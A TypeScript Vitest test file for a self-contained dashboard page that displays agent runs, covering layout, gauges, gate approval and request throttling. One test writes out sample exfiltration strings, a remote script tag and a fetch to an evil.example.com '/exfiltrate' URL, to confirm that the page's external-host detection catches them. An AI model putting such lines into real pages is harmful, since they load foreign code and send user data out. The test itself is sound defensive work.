import ts from 'typescript'
import { expect, test } from 'vitest'
import { buildPage } from './page.js'
import { matchRunRoute } from './mission-control-server.js'

test('the page is a complete, self-contained HTML document', () => {
  const html = buildPage()
  expect(html).toMatch(/^<!doctype html>/i)
  expect(html).toContain('<style>')
  expect(html).toContain('<script>')
  expect(html).toContain('</html>')
})

// The inline <script> block is TypeScript source text embedded in a giant
// template literal - `tsc` only ever sees it as a string, so a corrupted
// escape sequence inside it (e.g. \n or \s written with a single backslash,
// which the OUTER template literal itself interprets as an escape before the
// text ever reaches the browser - turning /\n\s*\n/ into a regex containing
// real newline bytes) compiles cleanly and produces a page whose embedded
// script is a hard SyntaxError, silently killing every dynamic feature with
// no compiler or lint signal. ts.transpileModule only parses/transpiles the
// extracted text - it never executes it - so this surfaces the same syntax
// error a browser would hit, without ever running the extracted text as
// code the way a dynamic-code-execution approach would.
test('the inline client script is syntactically valid JavaScript', () => {
  const html = buildPage()
  const match = html.match(/<script>([\s\S]*)<\/script>/)
  expect(match).not.toBeNull()
  const script = match![1]!
  const { diagnostics } = ts.transpileModule(script, { reportDiagnostics: true })
  const messages = (diagnostics ?? []).map((d) => ts.flattenDiagnosticMessageText(d.messageText, '\n'))
  expect(messages).toEqual([])
})

// The back-link is only ever shown when nested under mission control's
// /run/<hash>/<runId>/ route (see the inline script's back.style.display
// logic below), so its relative href must resolve from exactly that depth
// back to mission control's own root - not to the /run/ path one level short
// of it, which matchRunRoute (mission-control-server.ts) 404s on since it
// requires both a hash and a runId segment.
test('the back-link resolves from the nested run route to mission control\'s actual root, not a 404', () => {
  const html = buildPage()
  const match = html.match(/id="back-link" href="([^"]+)"/)
  expect(match).not.toBeNull()
  const href = match![1]!
  const resolved = new URL(href, 'http://localhost/run/somehash/somerunid/').pathname
  expect(resolved).toBe('/')
  expect(matchRunRoute(resolved)).toBeNull()
})

test('nothing in the page reaches out to an external host', () => {
  const html = buildPage()
  // A bare http(s):// substring scan is too broad: it also flags legitimate,
  // never-fetched strings like the SVG XML namespace URI passed to
  // createElementNS. Instead, scope the check to the actual ways a page can
  // reach out to a network host: link/script tags, and fetch/XHR/WebSocket/
  // EventSource calls that target an http(s):// URL (same-origin calls like
  // fetch('/model') or new EventSource('/events') are fine).
  expect(html).not.toMatch(/<link\b/i)          // no external stylesheet/font
  expect(html).not.toMatch(/<script\s+src=/i)   // no external script (only inline <script>)
  expect(html).not.toMatch(/fetch\(\s*['"]https?:/i)
  expect(html).not.toMatch(/new\s+(XMLHttpRequest|WebSocket|EventSource)\(\s*['"]https?:/i)
  expect(html).not.toMatch(/cdn\./i)
})

test('the self-containment check still catches a real external-URL violation', () => {
  const maliciousSnippet = '<script src="https://evil.example.com/x.js"></script>'
  expect(maliciousSnippet).toMatch(/<script\s+src=/i)

  const maliciousFetch = `fetch('https://evil.example.com/exfiltrate')`
  expect(maliciousFetch).toMatch(/fetch\(\s*['"]https?:/i)

  const maliciousEventSource = `new EventSource('https://evil.example.com/events')`
  expect(maliciousEventSource).toMatch(/new\s+(XMLHttpRequest|WebSocket|EventSource)\(\s*['"]https?:/i)
})

test('the inline client wires EventSource(\'events\') and fetch(\'model\') as relative URLs', () => {
  // Deliberately relative, not '/events'/'/model': this same page is served
  // both standalone at '/' and nested under mission control's
  // '/run/<hash>/<runId>/' - an absolute path would always hit the site
  // root and 404 under mission control.
  const html = buildPage()
  expect(html).toContain(`new EventSource('events')`)
  expect(html).toContain(`fetch('model')`)
})

// The halted/canceled reason string was previously small dim-gray text
// (#reason) sitting inline next to the run title - easy to miss and
// visually identical for a rail breach vs a deliberate user cancel. It
// must now be a prominent, full-width banner with distinct classes per
// status, hidden entirely outside those two statuses, and must reuse
// model.reason verbatim rather than inventing new wording.
test('the halted/canceled reason renders in a prominent banner, distinctly classed per status, hidden otherwise', () => {
  const html = buildPage()
  expect(html).toContain('id="reason-banner"')
  expect(html).toContain(".reason-banner.reason-halted")
  expect(html).toContain(".reason-banner.reason-canceled")
  // Distinct visible presentation, not just a bare className swap: a
  // border/background/color rule per status, not shared inline dim-gray text.
  const haltedRule = html.match(/\.reason-banner\.reason-halted\s*\{([^}]*)\}/)
  const canceledRule = html.match(/\.reason-banner\.reason-canceled\s*\{([^}]*)\}/)
  expect(haltedRule).not.toBeNull()
  expect(canceledRule).not.toBeNull()
  expect(haltedRule![1]).not.toBe(canceledRule![1])
  // The banner reuses model.reason verbatim - no new copy is authored here.
  expect(html).toContain("document.getElementById('reason').textContent = model.reason")
})

test('the reason banner is only shown for halted/canceled statuses, and hidden for running/verified', () => {
  const html = buildPage()
  const fnMatch = html.match(/function render\(model\) \{[\s\S]*?\n  \}/)
  expect(fnMatch).not.toBeNull()
  const body = fnMatch![0]
  expect(body).toMatch(/model\.status === 'halted'/)
  expect(body).toMatch(/model\.status === 'canceled'/)
  expect(body).toContain("reasonBanner.style.display = 'none'")
})

test('the page renders an empty-state message container for a run with no events yet', () => {
  const html = buildPage()
  expect(html).toContain('id="empty-state"')
})

test('the page defines a live-output section, hidden by default, with a tab strip and output body', () => {
  const html = buildPage()
  expect(html).toContain('id="live-output-section"')
  expect(html).toContain('id="live-tabs"')
  expect(html).toContain('id="live-output-body"')
})

test('the inline client renders live output tabs from the running nodes on every re-render', () => {
  const html = buildPage()
  expect(html).toContain('function renderLiveOutput(model)')
  expect(html).toContain('renderLiveOutput(model)') // called from render(model), not just defined
})

test('the default tab is the first running node, and clicking a tab is wired via addEventListener', () => {
  const html = buildPage()
  expect(html).toContain('selectedTab = running[0].id')
  expect(html).toContain('addEventListener')
})

test('the page has a Calls gauge, wired to totals.calls, distinct from iteration/replans', () => {
  const html = buildPage()
  expect(html).toContain('id="calls-label"')
  expect(html).toContain("document.getElementById('calls-label').textContent = String(model.totals.calls)")
})

test('the resume row includes a wall-minutes input alongside iterations/cost, prefilled from totals.maxWallMinutes and posted on resume', () => {
  const html = buildPage()
  expect(html).toContain('id="resume-wall-minutes"')
  expect(html).toContain('model.totals.maxWallMinutes')
  expect(html).toMatch(/maxWallMinutes:\s*wallMinutes/)
})

// Spend-by-agent's Nodes column previously joined every node id into one
// comma-separated string (g.nodeIds.join(', ')), which the cell's nowrap +
// ellipsis CSS then clipped once an agent backed many nodes. Each id must
// now render as its own child element instead, so nothing is ever hidden
// regardless of how many nodes one agent has.
test('the agent table renders each node id as a distinct element, not one joined string', () => {
  const html = buildPage()
  expect(html).not.toContain("g.nodeIds.join(', ')")
  expect(html).toContain('g.nodeIds.forEach(function (id) { nodeIdsCell.appendChild(htmlEl(\'div\', null, id)) })')
})

// The "this node: N tokens · $X (updates once it finishes)" line duplicated
// info already shown elsewhere (the per-node iteration list / Spend by
// Agent table) once a node finishes, and was misleading while running -
// it should be gone entirely, leaving only the role/agent line (r1).
test('the redundant "this node" tokens/cost line is removed from live-meta', () => {
  const html = buildPage()
  expect(html).not.toContain('this node: ')
  expect(html).not.toContain('updates once it finishes')
  // r1 (role/agent line) must still be present, untouched
  expect(html).toContain("r1.innerHTML = 'role <b>' + current.role + '</b>'")
})

// A single long plan version's <pre> must scroll internally instead of
// expanding the whole page's height without bound.
test('.plan-version pre has a bounded height with its own internal scroll', () => {
  const html = buildPage()
  const match = html.match(/\.plan-version pre\s*\{([^}]*)\}/)
  expect(match).not.toBeNull()
  const rule = match![1]!
  expect(rule).toMatch(/max-height:\s*\d/)
  expect(rule).toMatch(/overflow-y:\s*auto/)
})

// The DAG's svg viewBox/height already grow unbounded with node count -
// its container (#canvas-wrap) must cap that visually with its own
// max-height + scroll, and render() must recenter on whichever node is
// currently running (not a fixed corner) as it progresses.
test('#canvas-wrap caps the DAG height and auto-scrolls to follow the running node', () => {
  const html = buildPage()
  const match = html.match(/#canvas-wrap\s*\{([^}]*)\}/)
  expect(match).not.toBeNull()
  const rule = match![1]!
  expect(rule).toMatch(/max-height:\s*\d/)
  expect(rule).toMatch(/overflow:\s*auto/)
  expect(html).toContain("var runningNode = model.nodes.find(function (n) { return n.status === 'running'; });")
  expect(html).toContain('canvasWrap.scrollLeft = Math.max(0, centerX - canvasWrap.clientWidth / 2)')
  expect(html).toContain('canvasWrap.scrollTop = Math.max(0, centerY - canvasWrap.clientHeight / 2)')
})

// The svg's markup pins width to "100%"; leaving that attribute
// unoverridden means preserveAspectRatio shrinks the ENTIRE graph to
// stay visible as the viewBox's width grows, rather than ever
// overflowing #canvas-wrap - a linear dependency chain (a self-planning
// splice's mostly one-node-per-layer sequence) grows by x, not y, so this
// left it progressively squished and unreadable instead of scrollable.
// width/height must instead be driven by the real content size and the
// user-controllable zoom level (applyDagZoom), not a static percentage.
test('the DAG svg width/height are driven by content size and zoom level, not left at "100%"', () => {
  const html = buildPage()
  expect(html).toContain("svg.setAttribute('width', String(dagContentW * dagZoom))")
  expect(html).toContain("svg.setAttribute('height', String(dagContentH * dagZoom))")
})

// Explicit zoom/pan controls: a dense or deep self-planning graph needs a
// way to zoom out to see the whole shape, and to pan around it, not just
// rely on the browser's native scrollbars at a fixed 1:1 scale.
test('the DAG panel has zoom-in/zoom-out/fit controls wired to setDagZoom/fitDagZoom', () => {
  const html = buildPage()
  expect(html).toContain('id="dag-zoom-in"')
  expect(html).toContain('id="dag-zoom-out"')
  expect(html).toContain('id="dag-zoom-fit"')
  expect(html).toContain("document.getElementById('dag-zoom-in').addEventListener('click', function () { setDagZoom(dagZoom + DAG_ZOOM_STEP); });")
  expect(html).toContain("document.getElementById('dag-zoom-out').addEventListener('click', function () { setDagZoom(dagZoom - DAG_ZOOM_STEP); });")
  expect(html).toContain("document.getElementById('dag-zoom-fit').addEventListener('click', fitDagZoom);")
})

// Ctrl/Cmd+wheel zooms (the conventional browser gesture); a plain wheel
// must be left alone so ordinary two-axis scrolling over the graph still
// works like any other scrollable panel.
test('ctrl/cmd+wheel over the DAG zooms, plain wheel does not', () => {
  const html = buildPage()
  expect(html).toContain("if (!e.ctrlKey && !e.metaKey) return;")
  const wheelBlock = html.match(/dagWrap\.addEventListener\('wheel', function \(e\) \{[\s\S]*?\n  \}, \{ passive: false \}\);/)
  expect(wheelBlock).not.toBeNull()
})

// Executes the inline script's own htmlEl/renderReport functions (extracted
// verbatim from the built page, not reimplemented) against a minimal fake
// DOM, so this proves actual runtime behavior - not just that certain
// strings appear in the source - for the one property that matters here:
// the expandable files-touched element must exist if and only if
// report.filesTouched has something in it.
function loadRenderReport(): (report: unknown) => void {
  const html = buildPage()
  const script = html.match(/<script>([\s\S]*)<\/script>/)![1]!
  const htmlElSrc = script.match(/function htmlEl\(tag, className, text\) \{[\s\S]*?\n  \}\n/)![0]
  const renderReportSrc = script.match(/function renderReport\(report\) \{[\s\S]*?\n  \}\n(?=\n  \/\/|\n  function renderAgentTable)/)![0]
  const factory = new Function('document', `
    ${htmlElSrc}
    ${renderReportSrc}
    return renderReport;
  `)

  function makeFakeElement(tag: string) {
    return {
      tag,
      className: '',
      textContent: '',
      style: {} as Record<string, string>,
      children: [] as unknown[],
      appendChild(child: unknown) { this.children.push(child); return child },
      set innerHTML(_v: string) { this.children = [] },
    }
  }
  const store: Record<string, ReturnType<typeof makeFakeElement>> = {
    'report-head': makeFakeElement('div'),
    'report-panel': makeFakeElement('div'),
    'report-summary': makeFakeElement('div'),
    'report-claims': makeFakeElement('div'),
    'files-touched-container': makeFakeElement('div'),
  }
  const fakeDocument = {
    createElement: (tag: string) => makeFakeElement(tag),
    createTextNode: (text: string) => ({ tag: '#text', textContent: text }),
    getElementById: (id: string) => store[id],
    __store: store,
  }
  const renderReport = factory(fakeDocument) as (report: unknown) => void
  return Object.assign(renderReport, { store })
}

test('renderReport creates the expandable files-touched element only when filesTouched is non-empty', () => {
  const renderReport = loadRenderReport() as ((report: unknown) => void) & {
    store: Record<string, { children: unknown[] }>
  }
  renderReport({ summary: 's', source: 'agent', claims: [], filesTouched: ['a.ts', 'b.ts'] })
  const container = renderReport.store['files-touched-container']
  expect(container.children).toHaveLength(1)
  const details = container.children[0] as { tag: string; children: unknown[] }
  expect(details.tag).toBe('details')
  const summaryEl = details.children[0] as { tag: string; textContent: string }
  expect(summaryEl.tag).toBe('summary')
  expect(summaryEl.textContent).toBe('2 files touched')
  const list = details.children[1] as { tag: string; children: { textContent: string }[] }
  expect(list.tag).toBe('ul')
  expect(list.children.map((li) => li.textContent)).toEqual(['a.ts', 'b.ts'])
})

test('renderReport renders nothing for files-touched when filesTouched is empty or absent', () => {
  const renderReport = loadRenderReport() as ((report: unknown) => void) & {
    store: Record<string, { children: unknown[] }>
  }
  renderReport({ summary: 's', source: 'agent', claims: [], filesTouched: [] })
  expect(renderReport.store['files-touched-container'].children).toHaveLength(0)

  const renderReport2 = loadRenderReport() as ((report: unknown) => void) & {
    store: Record<string, { children: unknown[] }>
  }
  renderReport2({ summary: 's', source: 'agent', claims: [] })
  expect(renderReport2.store['files-touched-container'].children).toHaveLength(0)
})

// Final report and Plan evolution both previously sat as bare text with
// no visual container at all, unlike #detail-panel (Selected node) which
// has a proper boxed treatment - background/border/radius/padding. Match
// that same treatment on all three.
test('#report-panel and #plans have the same boxed-container treatment as #detail-panel', () => {
  const html = buildPage()
  const detailRule = html.match(/#detail-panel\s*\{([^}]*)\}/)
  const reportRule = html.match(/#report-panel\s*\{([^}]*)\}/)
  const plansRule = html.match(/#plans\s*\{([^}]*)\}/)
  expect(detailRule).not.toBeNull()
  expect(reportRule).not.toBeNull()
  expect(plansRule).not.toBeNull()
  for (const prop of ['background:', 'border:', 'border-radius:', 'padding:']) {
    expect(detailRule![1]).toContain(prop)
    expect(reportRule![1]).toContain(prop)
    expect(plansRule![1]).toContain(prop)
  }
})

// Reproduces a real observed bug: on a run whose journal has a lot of
// history (e.g. 1500+ events from a long, self-planning run), /events
// replays the ENTIRE history as one SSE frame per journal event (see
// sse.ts's buildReplay/encodeSseFrame - one frame per event, by design, so
// a client opening the dashboard after the run finished still gets full
// history). Every one of those frames fires the client's `es.onmessage`,
// and until this fix `es.onmessage` called `refresh()` with zero in-flight
// guard - so a single page load against a large journal launched hundreds
// of overlapping `fetch('model')` calls back-to-back, which is exactly what
// produced the reported `net::ERR_INSUFFICIENT_RESOURCES` storm (browsers
// cap pending same-origin requests). This executes the extracted, real
// `refresh()` source (not a reimplementation) against a stubbed fetch and
// proves it never has more than one `fetch('model')` in flight at a time,
// no matter how many times onmessage-equivalent calls arrive back-to-back.
function loadRefresh(): {
  refresh: () => Promise<void>
  getFetchCallCount: () => number
  getPeakConcurrentFetches: () => number
  resolveAllPendingFetches: () => Promise<void>
} {
  const html = buildPage()
  const script = html.match(/<script>([\s\S]*)<\/script>/)![1]!
  const refreshSrc = script.match(/var refreshInFlight[\s\S]*?function refresh\(\) \{[\s\S]*?\n  \}\n/)![0]

  let fetchCallCount = 0
  let inFlight = 0
  let peakConcurrent = 0
  const pendingResolvers: Array<() => void> = []
  const fakeFetch = () => {
    fetchCallCount++
    inFlight++
    peakConcurrent = Math.max(peakConcurrent, inFlight)
    return new Promise((resolve) => {
      pendingResolvers.push(() => {
        inFlight--
        resolve({ json: () => Promise.resolve({}) })
      })
    })
  }
  const fakeRender = () => {}

  const factory = new Function('fetch', 'render', `
    ${refreshSrc}
    return refresh;
  `)
  const refresh = factory(fakeFetch, fakeRender) as () => Promise<void>

  return {
    refresh,
    getFetchCallCount: () => fetchCallCount,
    getPeakConcurrentFetches: () => peakConcurrent,
    resolveAllPendingFetches: async () => {
      while (pendingResolvers.length > 0) pendingResolvers.pop()!()
      await Promise.resolve()
      await Promise.resolve()
    },
  }
}

test('refresh() never has more than one fetch(\'model\') in flight, even when called back-to-back many times (SSE replay storm)', async () => {
  const { refresh, getPeakConcurrentFetches, resolveAllPendingFetches } = loadRefresh()

  // Simulate a large journal's replay: many SSE messages arriving and
  // firing es.onmessage -> refresh() back-to-back before the first
  // fetch('model') has resolved - exactly what a 1500+-event journal
  // replay does on initial connect.
  for (let i = 0; i < 50; i++) refresh()
  await resolveAllPendingFetches()

  expect(getPeakConcurrentFetches()).toBeLessThanOrEqual(1)
})

// Terraform-Cloud-style gate approval: a form/button row shown ONLY while
// a gate is actually pending on this run (model.pendingGate, sourced from
// the dashboard's in-process gate registry), never a permanently-visible
// control - mirrors feedback-row/resume-row's conditional-display shape.
test('the page defines a gate-row for live gate approval, hidden by default, with approve/reject controls', () => {
  const html = buildPage()
  expect(html).toContain('id="gate-row"')
  const rowMatch = html.match(/<div class="gate-row" id="gate-row"([^>]*)>/)
  expect(rowMatch).not.toBeNull()
  expect(rowMatch![1]).toContain('display:none')
  expect(html).toContain('id="btn-gate-approve"')
  expect(html).toContain('id="btn-gate-reject"')
  expect(html).toContain('id="gate-reject-input"')
})

// Approve/reject must POST the exact same /control action shape
// serveControl already validates (action + optional text) - no separate
// endpoint or parallel approval mechanism.
test('the inline client posts approve-gate and reject-gate to /control, mirroring the feedback action shape', () => {
  const html = buildPage()
  expect(html).toMatch(/sendGateDecision\('approve-gate'\)/)
  expect(html).toMatch(/sendGateDecision\('reject-gate', text\)/)
  expect(html).toMatch(/action:\s*action/) // sendGateDecision forwards the action generically
  expect(html).toContain("fetch('control'")
  const fnMatch = html.match(/function sendGateDecision\(action, text\) \{[\s\S]*?\n  \}/)
  expect(fnMatch).not.toBeNull()
  expect(fnMatch![0]).toContain("text: text")
})

// render() must call renderGateRow on every re-render, the same way it
// already calls renderControls/renderFeedbackRow/renderResumeRow.
test('render(model) calls renderGateRow on every re-render', () => {
  const html = buildPage()
  const fnMatch = html.match(/function render\(model\) \{[\s\S]*?\n  \}/)
  expect(fnMatch).not.toBeNull()
  expect(fnMatch![0]).toContain('renderGateRow(model)')
})

// Executes the real renderGateRow function extracted from the built page
// against a minimal fake DOM, proving the row is shown if and only if
// model.status === 'running' && model.pendingGate is set - not merely that
// the right strings appear somewhere in the source.
function loadRenderGateRow(): (model: unknown) => void {
  const html = buildPage()
  const script = html.match(/<script>([\s\S]*)<\/script>/)![1]!
  const renderGateRowSrc = script.match(/function renderGateRow\(model\) \{[\s\S]*?\n  \}\n/)![0]
  const factory = new Function('document', `
    ${renderGateRowSrc}
    return renderGateRow;
  `)
  function makeFakeElement() {
    return { style: {} as Record<string, string>, textContent: '' }
  }
  const store: Record<string, ReturnType<typeof makeFakeElement>> = {
    'gate-row': makeFakeElement(),
    'gate-label': makeFakeElement(),
  }
  const fakeDocument = { getElementById: (id: string) => store[id] }
  const renderGateRow = factory(fakeDocument) as (model: unknown) => void
  return Object.assign(renderGateRow, { store })
}

test('renderGateRow shows the row only when running with a pendingGate, and labels plan-approval distinctly', () => {
  const renderGateRow = loadRenderGateRow() as ((model: unknown) => void) & {
    store: Record<string, { style: Record<string, string>; textContent: string }>
  }
  renderGateRow({ status: 'running', pendingGate: null })
  expect(renderGateRow.store['gate-row'].style.display).toBe('none')

  renderGateRow({ status: 'halted', pendingGate: { nodeId: 'n1', isPlanApproval: false } })
  expect(renderGateRow.store['gate-row'].style.display).toBe('none')

  renderGateRow({ status: 'running', pendingGate: { nodeId: 'n1', isPlanApproval: false } })
  expect(renderGateRow.store['gate-row'].style.display).toBe('flex')
  expect(renderGateRow.store['gate-label'].textContent).toBe('Gate awaiting approval')

  renderGateRow({ status: 'running', pendingGate: { nodeId: 'n2', isPlanApproval: true } })
  expect(renderGateRow.store['gate-row'].style.display).toBe('flex')
  expect(renderGateRow.store['gate-label'].textContent).toBe('Plan awaiting approval')
})

// When isPlanApproval is true, the row must not duplicate plan rendering -
// the existing "Plan evolution" section already shows the pending plan
// content, so gate-row's own markup must contain no plan-rendering logic.
test('the plan-approval gate row relies on the existing Plan evolution section, not a duplicate plan renderer', () => {
  const html = buildPage()
  const gateRowBlock = html.match(/<div class="gate-row"[\s\S]*?<\/div>/)![0]
  expect(gateRowBlock).not.toContain('plan-version')
  expect(html).toContain('Plan evolution')
})

test('the gauges row includes a Wall time gauge with its own meter', () => {
  const html = buildPage()
  expect(html).toContain('>Wall time<')
  expect(html).toContain('id="wall-label"')
  expect(html).toContain('id="wall-fill"')
})

// Executes the real renderMeter + renderWallGauge functions extracted from
// the built page against a minimal fake DOM. startedTs/lastEventTs are
// journal-derived (see view-model.ts) so buildViewModel itself stays pure;
// this proves the actual elapsed-minutes math and unit formatting, not
// merely that certain strings appear in the source.
function loadRenderWallGauge(): (totals: unknown, status: string) => void {
  const html = buildPage()
  const script = html.match(/<script>([\s\S]*)<\/script>/)![1]!
  const renderMeterSrc = script.match(/function renderMeter\(fillId, labelId, value, max, unit, estimated\) \{[\s\S]*?\n  \}\n/)![0]
  const wallGaugeSrc = script.match(/var wallGaugeTotals = null;[\s\S]*?\n  \}\n/)![0]
  const factory = new Function('document', `
    ${renderMeterSrc}
    ${wallGaugeSrc}
    return renderWallGauge;
  `)
  function makeFakeElement() {
    return { style: {} as Record<string, string>, className: '', innerHTML: '' }
  }
  const store: Record<string, ReturnType<typeof makeFakeElement>> = {
    'wall-fill': makeFakeElement(),
    'wall-label': makeFakeElement(),
  }
  const fakeDocument = { getElementById: (id: string) => store[id] }
  const renderWallGauge = factory(fakeDocument) as (totals: unknown, status: string) => void
  return Object.assign(renderWallGauge, { store })
}

test('renderWallGauge shows elapsed minutes since startedTs, capped/over-flagged against maxWallMinutes', () => {
  const renderWallGauge = loadRenderWallGauge() as ((totals: unknown, status: string) => void) & {
    store: Record<string, { style: { width?: string }; className: string; innerHTML: string }>
  }
  const startedTs = 1_000_000
  renderWallGauge({ startedTs, lastEventTs: startedTs + 5 * 60_000, maxWallMinutes: 30 }, 'verified')
  expect(renderWallGauge.store['wall-label'].innerHTML).toBe('5m<span class="of"> / 30m</span>')
  expect(renderWallGauge.store['wall-fill'].className).toBe('')

  renderWallGauge({ startedTs, lastEventTs: startedTs + 45 * 60_000, maxWallMinutes: 30 }, 'halted')
  expect(renderWallGauge.store['wall-label'].innerHTML).toBe('45m<span class="of"> / 30m</span>')
  expect(renderWallGauge.store['wall-fill'].className).toBe('over')

  renderWallGauge({ startedTs: undefined, lastEventTs: undefined, maxWallMinutes: 30 }, 'running')
  expect(renderWallGauge.store['wall-label'].innerHTML).toBe('0m<span class="of"> / 30m</span>')

  renderWallGauge({ startedTs, lastEventTs: startedTs + 5 * 60_000, maxWallMinutes: undefined }, 'halted')
  expect(renderWallGauge.store['wall-label'].innerHTML).toBe('5m<span class="of"> no max set</span>')
})

// Real bug reproduced live: a pure geometric midpoint bend let two entirely
// unrelated edges land on the exact same (x, y) bend corner - one edge's
// vertical continuing where another's ended made them read as a single
// continuous line through a shared node column, misattributing which node
// an edge actually came from. edgeBendFraction derives the bend point from
// the edge's own (sourceId, targetId) identity instead, so this proves two
// coincidentally-aligned edges get distinct fractions while the SAME edge
// stays stable across calls (no per-render jitter).
function loadEdgeBendFraction(): (sourceId: string, targetId: string) => number {
  const html = buildPage()
  const script = html.match(/<script>([\s\S]*)<\/script>/)![1]!
  const src = script.match(/function edgeBendFraction\(sourceId, targetId\) \{[\s\S]*?\n  \}\n/)![0]
  const factory = new Function(`
    ${src}
    return edgeBendFraction;
  `)
  return factory() as (sourceId: string, targetId: string) => number
}

test('edgeBendFraction is deterministic per edge and spreads coincidentally-aligned edges apart', () => {
  const edgeBendFraction = loadEdgeBendFraction()
  const a = edgeBendFraction('red-tests', 'review-coverage')
  const b = edgeBendFraction('implement', 'review-precision')
  expect(a).not.toBe(b)
  expect(edgeBendFraction('red-tests', 'review-coverage')).toBe(a)
  expect(a).toBeGreaterThanOrEqual(0.35)
  expect(a).toBeLessThanOrEqual(0.65)
})
